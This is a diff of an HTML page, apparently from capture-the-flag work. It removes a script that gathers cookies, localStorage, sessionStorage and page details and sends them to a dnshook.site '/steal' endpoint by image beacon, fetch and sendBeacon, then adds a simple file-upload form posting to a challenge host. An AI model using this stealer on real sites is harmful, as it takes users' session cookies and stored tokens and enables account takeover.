@@ -1,80 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: #f0f0f0;
-            font-family: Arial, sans-serif;
-        }
-    </style>
-</head>
+<html>
 <body>
-    <script>
-        // The FLAG cookie is set on domain "hack.the.planet.seccon"
-        // We need to read it from that domain context
-        
-        // Method 1: Try to read document.cookie directly
-        console.log("Cookies:", document.cookie);
-        
-        // Method 2: Send request to exfil server with all available data
-        const exfilData = {
-            cookies: document.cookie,
-            localStorage: {},
-            sessionStorage: {},
-            title: document.title,
-            url: window.location.href,
-            userAgent: navigator.userAgent,
-            timestamp: new Date().toISOString()
-        };
-        
-        // Try to get localStorage/sessionStorage
-        try {
-            for(let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                exfilData.localStorage[key] = localStorage.getItem(key);
-            }
-        } catch(e) {}
-        
-        try {
-            for(let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                exfilData.sessionStorage[key] = sessionStorage.getItem(key);
-            }
-        } catch(e) {}
-        
-        // Send data via multiple methods
-        function sendData() {
-            const encoded = btoa(JSON.stringify(exfilData));
-            
-            // Try image beacon
-            try {
-                const img = new Image();
-                img.src = 'https://hack.the.planet.seccon.cf1f2dfe-253c-4682-9476-51752a41e89f.dnshook.site/steal?data=' + encoded;
-            } catch(e) {}
-            
-            // Try fetch
-            try {
-                fetch('https://hack.the.planet.seccon.cf1f2dfe-253c-4682-9476-51752a41e89f.dnshook.site/steal', {
-                    method: 'POST',
-                    body: JSON.stringify(exfilData),
-                    mode: 'no-cors'
-                }).catch(() => {});
-            } catch(e) {}
-            
-            // Try sendBeacon
-            try {
-                navigator.sendBeacon('https://hack.the.planet.seccon.cf1f2dfe-253c-4682-9476-51752a41e89f.dnshook.site/steal', JSON.stringify(exfilData));
-            } catch(e) {}
-        }
-        
-        sendData();
-        setTimeout(sendData, 500);
-        setTimeout(sendData, 1000);
-    </script>
+<form action="http://4bejgq67fwjb43vq.instance.penguin.0ops.sjtu.cn:18080/?action=upload" method="POST" enctype="multipart/form-data">
+  <input type="file" name="file">
+  <input type="submit" value="Upload">
+</form>
 </body>
 </html>
